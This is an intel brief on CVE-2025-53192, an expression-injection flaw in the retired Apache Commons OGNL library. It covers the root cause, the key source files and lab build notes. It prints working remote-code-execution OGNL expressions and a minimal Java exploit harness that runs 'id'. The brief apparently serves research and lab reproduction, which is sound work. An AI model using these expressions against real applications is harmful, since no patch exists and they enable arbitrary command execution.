# Intel Brief: CVE-2025-53192

## CVE ID
CVE-2025-53192

## Affected Software
- **Name**: Apache Commons OGNL (Object-Graph Navigation Library)
- **Vendor**: Apache Software Foundation
- **Group ID / Artifact ID**: `org.apache.commons:commons-ognl`
- **Affected Versions**: All versions (project never had an official Maven Central release; current source is version `4.0-SNAPSHOT`)
- **Project Status**: DORMANT / RETIRED — no fix will be issued

## CVSS Score
- **Score**: 8.8 (HIGH)
- **Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
- **EPSS**: 0.03% (8th percentile)

## CWE Classification
- **CWE-146**: Improper Neutralization of Expression/Command Delimiters

## Description
Apache Commons OGNL contains an expression injection vulnerability in the `Ognl.getValue()` API (and related evaluation methods). The OGNL engine parses and evaluates user-provided expressions with powerful capabilities, including the ability to:

1. Load arbitrary classes via `@fully.qualified.ClassName@field` and `@fully.qualified.ClassName@method()` syntax
2. Invoke static methods on any class available on the classpath
3. Chain method calls to achieve arbitrary code execution
4. Instantiate objects via `new fully.qualified.ClassName(args)` syntax

The library's `DefaultClassResolver` resolves ANY class name via `ClassLoader.loadClass()` with zero restrictions — there is no class-level blocklist or denylist. The `DefaultMemberAccess` only checks Java access modifiers (public/private/protected) but does not restrict access to dangerous classes like `java.lang.Runtime`, `java.lang.ProcessBuilder`, `java.lang.Thread`, or `java.lang.ClassLoader`.

**Attack Vector**: An attacker who can control OGNL expressions passed to `Ognl.getValue()`, `Ognl.setValue()`, or `Ognl.parseExpression()` can achieve Remote Code Execution (RCE) by crafting expressions that invoke dangerous methods.

**Example malicious expressions**:
```
@java.lang.Runtime@getRuntime().exec("id")
(new java.lang.ProcessBuilder(new java.lang.String[]{"id"})).start()
@java.lang.Class@forName("java.lang.Runtime").getMethod("exec",new java.lang.Class[]{@java.lang.String@class}).invoke(@java.lang.Runtime@getRuntime(),new java.lang.Object[]{"id"})
```

## Repository URL
- **GitHub**: https://github.com/apache/commons-ognl
- **Clone URL**: https://github.com/apache/commons-ognl.git

## Vulnerable Version
- **Version**: `4.0-SNAPSHOT` (master branch HEAD)
- **Commit**: `003345d337f8ee824f79a24cc6cea4dfed66cf5d` (latest as of clone)
- **Note**: ALL versions of this library are vulnerable. The project was never officially released to Maven Central. The version in the repo is `4.0-SNAPSHOT`.

## Fix Commit
- **NONE** — The project is retired/dormant. The Apache advisory states: "As this project is retired, we do not plan to release a version that fixes this issue. Users are recommended to find an alternative or restrict access to the instance to trusted users."

## Patched Version
- **NONE** — No fix will be released.

## Build System
- **Build Tool**: Apache Maven (pom.xml)
- **Java Source Level**: 1.8 (Java 8)
- **Java Target Level**: 1.8 (Java 8)
- **Parser Generator**: JavaCC / JJTree (grammar files in `src/main/javacc/ognl.jj` and `src/main/jjtree/ognl.jjt`)
- **Packaging**: JAR

## Key Dependencies
| Dependency | Group ID | Version | Scope |
|---|---|---|---|
| Javassist | org.javassist:javassist | 3.29.2-GA | compile (runtime) |
| JUnit | junit:junit | 4.13.2 | test |
| EasyMock | org.easymock:easymock | 5.2.0 | test |

**Note**: Javassist is the only runtime dependency. It is required for the OGNL expression compiler (`ExpressionCompiler`). The core OGNL evaluation (parsing + interpretation) works without Javassist — compilation is optional.

## Key Source Files (Vulnerability Surface)

| File | Role |
|---|---|
| `src/main/java/org/apache/commons/ognl/Ognl.java` | Main API entry point — `getValue()`, `setValue()`, `parseExpression()` |
| `src/main/java/org/apache/commons/ognl/OgnlRuntime.java` | Core runtime — `callStaticMethod()`, `callMethod()`, `classForName()`, `invokeMethod()`, `getStaticField()` |
| `src/main/java/org/apache/commons/ognl/DefaultClassResolver.java` | Class resolution — loads ANY class by name via `ClassLoader.loadClass()` with NO restrictions |
| `src/main/java/org/apache/commons/ognl/DefaultMemberAccess.java` | Member access control — only checks Java visibility modifiers, no class-level deny list |
| `src/main/java/org/apache/commons/ognl/ObjectMethodAccessor.java` | Method invocation — dispatches to `OgnlRuntime.callAppropriateMethod()` |
| `src/main/java/org/apache/commons/ognl/ASTStaticMethod.java` | AST node for `@class@method()` — calls `OgnlRuntime.callStaticMethod()` |
| `src/main/java/org/apache/commons/ognl/ASTStaticField.java` | AST node for `@class@field` — calls `OgnlRuntime.getStaticField()` |
| `src/main/javacc/ognl.jj` | JavaCC parser grammar |

## Vulnerability Root Cause Analysis

The attack chain works as follows:

1. **Expression Parsing**: `Ognl.parseExpression()` parses an OGNL string into an AST. Static references like `@java.lang.Runtime@getRuntime()` create `ASTStaticMethod` nodes.

2. **Class Resolution**: `ASTStaticMethod.getValueBody()` calls `OgnlRuntime.callStaticMethod()`, which calls `OgnlRuntime.classForName()`. This delegates to `DefaultClassResolver.classForName()`, which does `ClassLoader.loadClass(className)` — loading ANY class on the classpath.

3. **Method Invocation**: `OgnlRuntime.callStaticMethod()` retrieves an `ObjectMethodAccessor` and calls `callStaticMethod()`, which gets the method via reflection and invokes it via `OgnlRuntime.callAppropriateMethod()` → `OgnlRuntime.invokeMethod()` → `method.invoke()`.

4. **No Security Checks**: At no point in this chain is the class name checked against a deny list. The `DefaultMemberAccess.isAccessible()` only checks `Modifier.isPublic()` — since `Runtime.getRuntime()` and `Runtime.exec()` are public, they pass.

## PoC Strategy

Build a minimal Java application that:
1. Adds `commons-ognl` (built from source) to the classpath
2. Creates an OGNL context with a root object
3. Calls `Ognl.getValue()` with a malicious expression
4. Demonstrates RCE via `@java.lang.Runtime@getRuntime().exec()`

**Build steps for lab**:
```bash
cd source
mvn package -DskipTests  # Builds commons-ognl-4.0-SNAPSHOT.jar
```

**Minimal PoC harness** (Java):
```java
import org.apache.commons.ognl.Ognl;
import org.apache.commons.ognl.OgnlContext;

public class Exploit {
    public static void main(String[] args) throws Exception {
        OgnlContext context = new OgnlContext();
        String expr = "@java.lang.Runtime@getRuntime().exec(\"id\")";
        Object tree = Ognl.parseExpression(expr);
        Object result = Ognl.getValue(tree, context, new Object());
        System.out.println("Executed: " + result);
    }
}
```

## Public Exploits
- **Known PoCs**: NONE specific to CVE-2025-53192
- **Related**: Extensive OGNL injection PoCs exist for downstream frameworks (Struts2 CVE-2018-11776, Confluence CVE-2022-26134, CVE-2021-26084) but those use different entry points
- **Nuclei Templates**: None available
- **Metasploit Modules**: None specific to this CVE

## References
1. **Apache Mailing List Advisory**: https://lists.apache.org/thread/2gj8tjl6vz949nnp3yxz3okm9xz2k7sp
2. **OSS-Security**: http://www.openwall.com/lists/oss-security/2025/08/18/4
3. **GHSA**: https://github.com/advisories/GHSA-5vgh-76mj-8hcq
4. **NVD**: https://nvd.nist.gov/vuln/detail/CVE-2025-53192
5. **Source Repository**: https://github.com/apache/commons-ognl
6. **Apache Commons OGNL (Dormant)**: https://commons.apache.org/dormant/commons-ognl/

## Credit
- Discovered by: **yyjLF**

## Lab Build Notes

### Docker Image Requirements
- Base: JDK 8 (Java 8) — matches `maven.compiler.source` / `maven.compiler.target` in pom.xml
- Maven 3.x for building
- Internet access for Maven dependency resolution (Javassist, etc.)

### JDK Compatibility
- JDK 8 is ideal (matches source/target level)
- JDK 11 works with minor warnings
- JDK 17+ requires `--add-opens` flags (see pom.xml `jdk17` profile): `--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED`

### Build Command
```bash
cd source
mvn package -DskipTests -q
# Output JAR: target/commons-ognl-4.0-SNAPSHOT.jar
```

### PoC Compilation
```bash
# Compile with commons-ognl and javassist on classpath
javac -cp target/commons-ognl-4.0-SNAPSHOT.jar Exploit.java
# Run
java -cp .:target/commons-ognl-4.0-SNAPSHOT.jar:$HOME/.m2/repository/org/javassist/javassist/3.29.2-GA/javassist-3.29.2-GA.jar Exploit
```
